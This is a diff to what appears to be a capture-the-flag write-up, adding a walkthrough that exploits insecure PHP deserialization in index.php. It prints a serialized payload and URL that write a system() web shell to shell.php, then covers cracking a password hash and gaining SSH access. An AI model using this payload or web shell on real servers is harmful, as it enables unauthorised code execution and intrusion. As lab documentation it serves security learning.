@@ -5,6 +5,8 @@
 
 --------------------
 
+![image](https://github.com/user-attachments/assets/7a87a1ed-8d4c-43fd-a5f9-0a391f20067c)
+
 
 ### Recon
 
@@ -96,10 +98,84 @@
 
 
 ### CODE REVIEW OF index.php
+### Main vulnerability: Insecure Deserialization in function `unserialze()`
 
--
+- Index.php accept a get parameter `debug` which is then unserialized by the `unserialize()` function
+
+      $debug = $_GET['debug'] ?? '';
+      $messageDebug = unserialize($debug);
+
+- `Unserialize()` is vulnerable to insecure deserialization which can be used to gain remote code execution as explained in this [site](https://www.invicti.com/blog/web-security/untrusted-data-unserialize-php/)
+
+-  Abusing the unserialize function, we can access class `FormSubmit` which requires variables `form_file` and `message`.This class later runs the `__destruct` magic object to write the value of message to the form_file using the `file_puts_contents()` function.
+
+            class FormSubmit {
+            
+            public $form_file = 'message.txt';
+            public $message = '';
+            
+            public function SaveMessage() {
+            
+            $NameArea = $_GET['name']; 
+            $EmailArea = $_GET['email'];
+            $TextArea = $_GET['comments'];
+            
+            	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
+            
+            }
+            
+            public function __destruct() {
+            
+            file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
+            echo 'Your submission has been successfully saved!';
+            
+            }
+
+### Exploit
+
+- Exploit:
+
+         O:10:"FormSubmit":2:{s:9:"form_file";s:9:"shell.php";s:7:"message";s:35:"<?php echo system($_GET['cmd']); ?>";}
+
+- This exploit will call class `FormSubmit` and write a  php web shell code to shell.php in the current directory.
+- Running it
+
+      http://<ip>/index.php?debug=O:10:%22FormSubmit%22:2:{s:9:%22form_file%22;s:9:%22shell.php%22;s:7:%22message%22;s:35:%22%3C?php%20echo%20system($_GET[%27cmd%27]);%20?%3E%22;}
+
+- Our web shell is ready
+
+![image](https://github.com/user-attachments/assets/06daccd3-9901-4409-a667-a2931e43f731)
 
 
+### Initial Foothold
+
+- Shell as www-data:
+
+![image](https://github.com/user-attachments/assets/052ae04f-6d1b-43f4-bdf1-f340ef67a9aa)
+
+- Running `linpeas.sh` privesc enumeration script  reveals user `james` hash stored in `.htpasswd`
+
+![image](https://github.com/user-attachments/assets/d6e1645e-bbbf-4269-91d3-2b6267aa68e2)
+
+- Cracking the shadow hash with John
+
+![image](https://github.com/user-attachments/assets/3150b002-d493-41a1-83bc-cc0d28c63089)
+
+- SSH access
+
+![image](https://github.com/user-attachments/assets/4440561e-a28a-4ffb-9f4b-0a15e05815d9)
+
+### PRIVESC with update-motd
+
+- An hint in  txt file reveals that we can modify ssh motd `message of the day` files.
+
+
+
+
+
+
+
+  
   
 
 
